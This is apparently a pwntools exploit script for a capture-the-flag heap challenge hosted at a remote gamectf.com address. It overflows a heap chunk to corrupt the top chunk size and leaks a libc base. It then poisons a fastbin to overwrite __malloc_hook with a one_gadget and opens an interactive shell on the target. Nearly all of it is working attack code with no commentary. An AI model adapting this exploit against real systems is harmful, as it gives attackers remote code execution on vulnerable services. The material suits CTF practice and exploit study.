from pwn import *
context.log_level = 'debug'
prog = './pwn'
elf = ELF(prog)
#p = process(prog)
libc = ELF("./libc-2.23.so")
p = remote("55fca716.gamectf.com", 37009)
def dbg():
    gdb.attach(p)
    p.interactive()

def add(size, content):
	p.sendlineafter("Your choice > ", '1')
	p.sendlineafter("Size > ", str(size))
	p.sendafter("Content > ", content)
def show():
	p.sendlineafter("Your choice > ", '2')
def edit(size, content):
	p.sendlineafter("Your choice > ", '4')
	p.sendlineafter("Size > ", str(size))
	p.sendafter("Content > ", content)
def free():
	p.sendlineafter("Your choice > ", '3')
def exp():
	p.sendlineafter("name?\n", 'aaa')
	add(0x20, 'a')	
	add(0x88, 'a')
	edit(0x90, 'a'*0x80+p64(0)+p64(0xf41))
	add(0x1000, 'aaaaaaaa')
	add(0x400, 'aaaaaaaa')
	show()	
	libc_base = u64(p.recvuntil("\x7f")[-6:]+'\x00'*2)-0x3c5188
	malloc_hook = libc.sym['__malloc_hook']+libc_base-0x23
	realloc = libc.sym['realloc']+libc_base
	add(0x60, 'a')
	free()
	edit(8, p64(malloc_hook))
	add(0x60, 'a')
	add(0x60, 'aaa'+p64(0)*2+p64(libc_base+0xf02a4))
	p.interactive()
if __name__ == '__main__':
	exp()
